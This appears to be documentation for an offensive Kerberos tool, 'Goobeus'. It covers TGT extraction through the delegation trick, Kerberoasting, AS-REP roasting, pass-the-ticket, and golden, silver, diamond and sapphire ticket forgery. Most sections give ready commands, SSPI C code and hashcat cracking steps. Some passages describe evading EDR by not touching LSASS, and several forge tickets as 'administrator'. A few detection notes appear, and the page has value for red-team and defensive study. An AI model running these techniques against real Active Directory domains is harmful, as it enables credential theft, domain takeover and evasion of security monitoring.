# Kerberos Attack Techniques

> This document covers common Kerberos attacks with in-depth technical explanations. Each attack includes the theory, prerequisites, detection, and how to execute with Goobeus.

## Table of Contents

1. [TGTDeleg (Delegation Trick)](#tgtdeleg-delegation-trick) ⭐ **Featured**
2. [Kerberoasting](#kerberoasting)
3. [AS-REP Roasting](#as-rep-roasting)
4. [Pass-the-Ticket](#pass-the-ticket)
5. [Golden Ticket](#golden-ticket)
6. [Silver Ticket](#silver-ticket)
7. [Diamond Ticket](#diamond-ticket)
8. [Sapphire Ticket](#sapphire-ticket)

---

## TGTDeleg (Delegation Trick)

### Overview

**TGTDeleg** is a technique to extract your own TGT **without touching LSASS**. This is critical for:

- Evading EDR/AV that monitors LSASS access
- Operating without SeDebugPrivilege
- Getting a usable TGT for Kerberos attacks

### The Theory

When you authenticate to a service that supports **Kerberos delegation**, your TGT gets embedded in the authentication token. By tricking Windows into creating this authentication context and then inspecting the resulting token, we can extract the embedded TGT.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        TGTDeleg Flow                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  1. Create SSPI security context targeting any SPN                          │
│     ┌──────────┐    InitializeSecurityContext()   ┌──────────┐             │
│     │  Client  │ ────────────────────────────────▶│   SSPI   │             │
│     │          │◀──────────────────────────────── │          │             │
│     └──────────┘    Returns AP-REQ token          └──────────┘             │
│                                                                             │
│  2. Request with ISC_REQ_DELEGATE flag                                      │
│     Windows embeds a FORWARDED TGT in the Authenticator!                    │
│                                                                             │
│  3. Parse the AP-REQ token                                                  │
│     ┌─────────────────────────────────────────────────────────┐            │
│     │  AP-REQ                                                  │            │
│     │  ├── pvno: 5                                             │            │
│     │  ├── msg-type: 14                                        │            │
│     │  ├── ap-options: (MUTUAL-REQUIRED)                       │            │
│     │  ├── ticket: [Service ticket, encrypted]                 │            │
│     │  └── authenticator: [Encrypted with session key]         │            │
│     │      └── cksum: [GSS Checksum]                           │            │
│     │          ├── Flags: GSS_C_DELEG_FLAG (0x01)             │            │
│     │          └── KRB-CRED: [THE FORWARDED TGT!] ⭐           │            │
│     └─────────────────────────────────────────────────────────┘            │
│                                                                             │
│  4. Get session key from ticket cache                                       │
│     └── QueryCredentialsAttributes or ticket cache lookup                  │
│                                                                             │
│  5. Decrypt authenticator with session key                                  │
│     └── AES-256-CTS-HMAC-SHA1 (key usage 11)                               │
│                                                                             │
│  6. Extract KRB-CRED from GSS checksum                                      │
│     └── Parse delegation data at offset 28+                                │
│                                                                             │
│  7. You now have the forwarded TGT!                                         │
│     └── Can be used for TGS requests, S4U, cross-realm, etc.               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### GSS Checksum Structure

The GSS checksum (RFC 4121) in the Authenticator contains the delegation data:

```
┌────────────────────────────────────────────────────────────────┐
│  GSS Checksum (cksum field in Authenticator)                   │
├────────────────────────────────────────────────────────────────┤
│  Bytes 0-3:   Binding length (usually 16)                      │
│  Bytes 4-19:  Channel bindings (usually zeros)                 │
│  Byte 20:     Flags                                             │
│               └── Bit 0 = GSS_C_DELEG_FLAG (must be 1)         │
│  Bytes 21-25: Reserved                                          │
│  Bytes 26-27: Delegation length (little-endian uint16)         │
│  Bytes 28+:   KRB-CRED (the forwarded TGT!)                    │
└────────────────────────────────────────────────────────────────┘
```

### Detailed Step-by-Step

#### Step 1: Acquire Credentials Handle

```c
// SSPI call to get credentials for current user
AcquireCredentialsHandle(
    NULL,                    // Use current user
    L"Kerberos",            // Kerberos package
    SECPKG_CRED_OUTBOUND,   // Client credentials
    NULL, NULL, NULL, NULL,
    &credHandle,
    &expiry
);
```

#### Step 2: Initialize Security Context with DELEGATE Flag

```c
// Target SPN (any service that exists)
WCHAR* targetSPN = L"HOST/dc01.corp.local";

// The magic flag that triggers TGT forwarding
DWORD contextReq = ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY;

InitializeSecurityContext(
    &credHandle,
    NULL,                    // First call, no existing context
    targetSPN,
    contextReq,              // Request delegation!
    0, 
    SECURITY_NATIVE_DREP,
    NULL,
    0,
    &secContext,
    &outputBuffer,           // Contains the AP-REQ with embedded TGT
    &contextAttr,
    &expiry
);
```

**Key Point:** The `ISC_REQ_DELEGATE` flag tells Windows to include a forwarded TGT in the authenticator. Windows will:

1. Check if the TGT is forwardable
2. Request a new forwarded TGT from the KDC
3. Embed it in the authenticator's GSS checksum

#### Step 3: Parse the AP-REQ

The output buffer contains a GSS-wrapped AP-REQ:

```
GSS Token:
├── OID (1.2.840.113554.1.2.2 = Kerberos)
└── innerToken (AP-REQ starting with 0x6e)
```

We parse the AP-REQ to get:

- The service ticket (encrypted, but we can read the realm and SPN)
- The authenticator (encrypted with session key)

#### Step 4: Get the Session Key

This is the tricky part! The authenticator is encrypted with the **session key** from the service ticket. We need this key to decrypt.

**Method 1: QueryContextAttributes (preferred)**

```c
SecPkgContext_SessionKey sessionKey;
QueryContextAttributes(&secContext, SECPKG_ATTR_SESSION_KEY, &sessionKey);
// sessionKey.SessionKey contains the key
```

**Method 2: Ticket Cache Lookup**

If QueryContextAttributes fails, we can look up the service ticket in the cache:

```c
// Use LsaCallAuthenticationPackage with KERB_RETRIEVE_TKT_REQUEST
// to get the session key for the service ticket
```

#### Step 5: Decrypt the Authenticator

Using AES-256-CTS-HMAC-SHA1-96 with key usage 11 (AP-REQ authenticator):

```
plaintext = AES-Decrypt(
    key = sessionKey,
    ciphertext = authenticator.encPart.cipher,
    usage = 11
)
```

#### Step 6: Parse GSS Checksum and Extract TGT

The decrypted authenticator contains:

```
Authenticator ::= [APPLICATION 2] SEQUENCE {
    authenticator-vno [0] INTEGER,
    crealm            [1] Realm,
    cname             [2] PrincipalName,
    cksum             [3] Checksum,         // <-- GSS checksum here!
    cusec             [4] Microseconds,
    ctime             [5] KerberosTime,
    ...
}
```

Parse the cksum field using the GSS checksum structure above, and extract the KRB-CRED starting at byte 28.

### Prerequisites

| Requirement | Notes |
|-------------|-------|
| Domain-joined machine | Must have Kerberos context |
| Valid TGT in cache | User must be logged in |
| Forwardable TGT | Most TGTs are forwardable by default |
| Target SPN exists | Any SPN will do (HOST/dc, CIFS/dc, etc.) |

### Detection

| Behavior | Detection Method |
|----------|------------------|
| TGS-REQ for service ticket | Normal, but monitor for unusual SPNs |
| Forwardable TGT request | Event ID 4768 with `0x40e10000` flags |
| No LSASS access | This is the evasion goal! |

### Goobeus Usage

```powershell
# Extract TGT via delegation trick
.\goobeus.exe tgtdeleg

# Extract and save to file
.\goobeus.exe tgtdeleg -o mytgt.kirbi

# Use the TGT for further attacks
.\goobeus.exe ptt -i mytgt.kirbi
.\goobeus.exe s4u -ticket mytgt.kirbi -impersonate administrator -msdsspn cifs/dc01
```

### Why This Works

1. **Kerberos delegation is a feature, not a bug** - Windows intentionally forwards TGTs to trusted services
2. **SSPI handles the complexity** - We don't need to implement the protocol, just set the right flags
3. **The TGT is in user-mode memory** - No need to access LSASS kernel memory
4. **EDR blind spot** - Most EDRs focus on LSASS access, not SSPI calls

### Comparison with Other Methods

| Method | Requires Admin? | Touches LSASS? | EDR Risk |
|--------|----------------|----------------|----------|
| tgtdeleg | No | No | Low |
| Mimikatz sekurlsa | Yes | Yes | High |
| Rubeus dump | Yes | Yes | High |
| Ticket cache (klist) | No | No | Low (but just lists, doesn't export full ticket) |

---

## Kerberoasting

### Overview

Request service tickets for SPNs, crack them offline to obtain service account passwords.

### The Theory

- Service tickets are encrypted with the service account's password hash
- Any domain user can request a ticket for any SPN
- Requested tickets can be cracked offline with no account lockout

```
┌─────────┐    TGS-REQ (SPN)    ┌─────────┐
│ Attacker│ ─────────────────▶ │   KDC   │
│         │ ◀───────────────── │         │
└─────────┘    TGS-REP (ST)    └─────────┘
                    │
                    ▼
            ┌───────────────┐
            │ Crack offline │
            │ with Hashcat  │
            └───────────────┘
```

### Goobeus Usage

```bash
# Roast all SPNs
goobeus.exe kerberoast -d corp.local -dc dc01.corp.local

# Roast specific SPN
goobeus.exe kerberoast -spn MSSQLSvc/sql01.corp.local:1433

# Output for hashcat
goobeus.exe kerberoast -format hashcat -o hashes.txt
```

### Cracking

```bash
# Hashcat (RC4)
hashcat -m 13100 hashes.txt wordlist.txt

# Hashcat (AES256)
hashcat -m 19700 hashes.txt wordlist.txt
```

---

## AS-REP Roasting

### Overview

Target accounts with "Do not require Kerberos preauthentication" enabled.

### The Theory

- Normally, AS-REQ requires encrypted timestamp (proves password knowledge)
- If pre-auth is disabled, KDC returns AS-REP with encrypted data
- This encrypted data can be cracked like any Kerberos ticket

### Goobeus Usage

```bash
# Find and roast AS-REP roastable accounts
goobeus.exe asreproast -d corp.local -dc dc01.corp.local

# Target specific user
goobeus.exe asreproast -d corp.local -u vulnerable_user
```

---

## Pass-the-Ticket

### Overview

Use a stolen ticket to authenticate as another user.

### Goobeus Usage

```bash
# Import ticket into current session
goobeus.exe ptt -i admin.kirbi

# Now access resources as the ticket owner
dir \\dc01\c$
```

---

## Golden Ticket

### Overview

Forge a TGT using the krbtgt hash. Valid for 10 years by default!

### Prerequisites

- krbtgt NTLM hash or AES key
- Domain SID
- Target username (can be fake)

### Goobeus Usage

```bash
goobeus.exe golden \
    -d corp.local \
    -sid S-1-5-21-1234567890-1234567890-1234567890 \
    -krbtgt aad3b435b51404eeaad3b435b51404ee \
    -user fakeadmin \
    -groups 512,513,518,519,520 \
    -o golden.kirbi
```

---

## Silver Ticket

### Overview

Forge a service ticket using the service account's hash. No KDC contact needed!

### Prerequisites

- Service account NTLM hash or AES key
- Domain SID
- Target SPN

### Goobeus Usage

```bash
goobeus.exe silver \
    -d corp.local \
    -sid S-1-5-21-... \
    -rc4 <service_hash> \
    -service cifs/fileserver.corp.local \
    -user administrator \
    -o silver.kirbi
```

---

## Diamond Ticket

### Overview

Modify an existing legitimate TGT instead of forging from scratch. Harder to detect.

### The Theory

1. Get a legitimate TGT (for any user)
2. Decrypt it with krbtgt key
3. Modify the PAC (add admin groups, change username)
4. Re-encrypt with krbtgt key

### Goobeus Usage

```bash
goobeus.exe diamond \
    -ticket legitimate.kirbi \
    -krbtgt <krbtgt_hash> \
    -target-user administrator \
    -o diamond.kirbi
```

---

## Sapphire Ticket

### Overview

The stealthiest ticket forgery using S4U2Self + U2U. No need for krbtgt hash!

### The Theory

Uses legitimate KDC interactions:

1. S4U2Self to get ticket for target user
2. U2U to encrypt with a known key
3. Result: Valid ticket signed by real KDC

### Prerequisites

- TGT for a machine account you control
- Target domain and user

### Goobeus Usage

```bash
goobeus.exe sapphire \
    -ticket machine$.kirbi \
    -target-user administrator \
    -target-domain corp.local \
    -o sapphire.kirbi
```

---

## Related Documents

- [KERBEROS_101.md](KERBEROS_101.md) - Kerberos fundamentals
- [ENCRYPTION.md](ENCRYPTION.md) - Encryption types
- [TICKETS.md](TICKETS.md) - Ticket structure
- [DELEGATION.md](DELEGATION.md) - Delegation abuse
